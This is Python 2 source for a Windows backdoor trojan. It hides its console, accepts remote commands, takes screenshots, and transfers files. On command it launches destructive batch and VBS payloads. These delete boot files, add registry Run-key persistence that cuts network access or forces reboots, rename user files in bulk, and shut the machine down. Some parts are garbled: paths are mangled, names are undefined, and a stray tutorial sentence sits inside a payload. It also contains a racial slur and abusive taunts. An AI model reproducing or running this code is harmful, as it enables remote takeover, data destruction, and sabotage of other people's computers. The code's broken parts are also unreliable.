# -*- coding: utf-8 -*-
show = '''
........................................
........................................
........... Created by the Duke.........
........................................
........................................

    THE BEAST UNLEASED... You\'re HACKED

'''

__authour__ = 'DUKE'
import socket, os, sys
import base64
import threading
os.system('color 4')
import ctypes
from time import ctime
MyName = sys.argv[0]


global user32
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
hWnd = kernel32.GetConsoleWindow()
user32.ShowWindow(hWnd, 0)

print show

def Texter(TEXT, ICON, TITLE):
    f=open('temp.vbs', 'w')
    loophead = 'do\n'
    body =  'x=msgbox(\"'+TEXT+'\", '+ICON+',\"'+TITLE+'\" )\n'
    loopend = 'loop'
    f.write(loophead + body + loopend)
    os.popen('script temp.vbs')

def foreversleep():
    code = '''
@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
@echo off
msg * YOU GOT OWNED!!!
shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive

'''
    f=open('4eversleep.bat', 'w')
    f.write(code)
    f.close()
    os.system('start 4eversleep.bat')

def DisableINET():
    code = '''
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE
'''
    f=open('DISABLENET.bat','w')
    f.write(code)
    f.close()
    os.system('start DISABLENET.bat')

def MeltDown():
    code = '''
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT

PAUSE

PAUSE
'''
    f=open('meltdown.bat', 'w')
    f.write(code)
    f.close()
    os.system('start meltdown.bat')

def ShutItDown():
    code = '''
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You have been HACKED.
PAUSE
'''
    f=open('shutdown.bat','w')
    f.write(code)
    f.close()
    os.system('start shutdown.bat')

def PopOut():
    code = '''
Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
loop
'''
    f=open('pTemp.vbs', 'w')
    f.write(code)
    f.close()
    os.system('start pTemp.vbs')

def Flash():
    code = '''
@echo off
echo e100 B8 13 00 CD 10 E4 40 88 C3 E4 40 88 C7 F6 E3 30>\\z.dbg
echo e110 DF 88 C1 BA C8 03 30 C0 EE BA DA 03 EC A8 08 75>>\\z.dbg
echo e120 FB EC A8 08 74 FB BA C9 03 88 D8 EE 88 F8 EE 88>>\\z.dbg
echo e130 C8 EE B4 01 CD 16 74 CD B8 03 00 CD 10 C3>>\\z.dbg
echo g=100>>\\z.dbg
echo q>>\\z.dbg
debug <\\z.dbg>nul
del \\z.dbg
But if you really want to mess with a friend then copy and paste the following code which will do the same thing except when they press a key the screen will go black and the only way to stop the batch file is by pressing CTRL-ALT-DELETE.
@echo off
:a
echo e100 B8 13 00 CD 10 E4 40 88 C3 E4 40 88 C7 F6 E3 30>\\z.dbg
echo e110 DF 88 C1 BA C8 03 30 C0 EE BA DA 03 EC A8 08 75>>\\z.dbg
echo e120 FB EC A8 08 74 FB BA C9 03 88 D8 EE 88 F8 EE 88>>\\z.dbg
echo e130 C8 EE B4 01 CD 16 74 CD B8 03 00 CD 10 C3>>\\z.dbg
echo g=100>>\\z.dbg
echo q>>\\z.dbg
debug <\\z.dbg>nul
del \\z.dbg
goto a
'''
    f=open('Ftemp.bat','w')
    f.write(code)
    f.close()
    os.system('start Ftemp.bat')

def ChangeWall(IMG):
    SPI_SETDESKWALLPAPER = 20 
    user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, IMG , 0)

def ShowMessage(MESSAGE):
    f=open('tmp.bat', 'w')
    cmd = 'msg * ' + MESSAGE
    f.write(cmd)
    f.close
    os.popen('start tmp.bat')
    

def GetCookies(loc):
    import sqlite3
    DataBase = loc
    con = sqlite3.connect(DataBase)
    Cursor = con.cyrsor()
    data = cur.execute('select * from moz_cookies')
    Data = data.fetchall()
    f=open('cookie.txt', 'w')
    f.write(Data)
    f.close
    

def showdanger():
    for i in range(40):
        os.system('color 04')
        os.system('color 40')
    os.system('color 4')
    
def download(FILENAME):
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((HOST, LPORT))
    sock.send(FILENAME)
    ifexist = sock.recv(1024)
    if ifexist == 'True':
        size = sock.recv(1024)
        sock.send('GETIT')
        f= open(FILENAME , 'wb')
        data = sock.recv(1024)
        while True:
            f.write(data)
            data = sock.recv(1024)
            if data == 'ENDOFTHELINE':
                    break           
        sock.close()
        print 'DONE'
def upload(FILENAME):
    import socket, os
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, LPORT))
    sock.listen(10)
    print ' 3Waiting...' 
    c, addr = sock.accept()
    print ' [+] Connected!'
    FILENAME = c.recv(1024)
    if os.path.isfile(FILENAME) == True:
        c.sendall('True')
        size = os.path.getsize(FILENAME)
        c.sendall(str(size))
        opt = c.recv(1024)
        if opt == 'GETIT':
            f = open(FILENAME , 'rb')
            data = f.read(1024)
            while data != '':
                c.sendall(data)
                data = f.read(1024)
            c.sendall('ENDOFTHELINE')
            print 'DONE'
    else:
        c.sendall('nOPE')
    sock.close()

def screenshot():
    from PIL import ImageGrab
    snap = ImageGrab.grab()
    fname=str(ctime())+'.jpeg'
    snap.save(fname)
    return fname

def VirusHandler():
                print 'ROLLIN'
                name = c.recv(1024)
                print 'IN VIRUS'
                if name == 'cdpop':
                    PopOut()
                    c.sendall('DONE!... He would be fraking out now')
                elif name == 'flashscreen':
                    Flash()
                    c.sendall('Done That nigga will be wondering dafaq is happening')
                elif name == 'meltdown':
                    MeltDown()
                    c.sendall('DONE! That must hurt xD')
                elif name == 'DisableINET':
                    DisableINET()
                    c.sendall('WELL... you screwed the Internet just now')
                elif name == '4eversleep':
                    foreversleep()
                    c.sendall('Damn bro... you just killed the machine O_O')
                elif name == 'shutitdown':
                    ShutItDown()
                    c.sendall('Goodbye you must have thought bout it ')


def GetIP():
    return 'localhost'

def main():
    global HOST, LPORT
    global s, c
    LPORT = 9010
    s=socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(10)
    print ' [+] Listening...'
    c, addr = s.accept()
    shell = os.getcwd()
    c.sendall(shell)
    while True:
            print ('-'*32)
            command = c.recv(1024)
            if command == 'upload':
                FILENAME = c.recv(1024)
                download(FILENAME)
            elif command[:2] == 'cd':
                try:
                    os.chdir(command[3:])
                    directory = os.getcwd()
                    c.sendall(directory)
                except:
                    c.sendall('The system cannot find the path specified.')
            elif command == 'message':
                message = c.recv(1024)
                title = c.recv(1024)
                icon = c.recv(1024)
                Texter(message, icon, title)
                
            elif command == 'download':
                FILENAME = c.recv(1024)
                upload(FILENAME)
            elif command == 'getscreenshot':
                name = screenshot()
                c.sendall('GOT IT '+ name)
            elif command == 'virus':
                VirusHandler()
            else:
                op=os.popen(command).read()
                if op == '':
                    c.sendall('NONE')
                elif op == '\n':
                    c.sendall('NONE')
                else:
                    c.sendall(op)

HOST='127.0.0.1'
PORT=8083
if __name__ == '__main__':
   main()
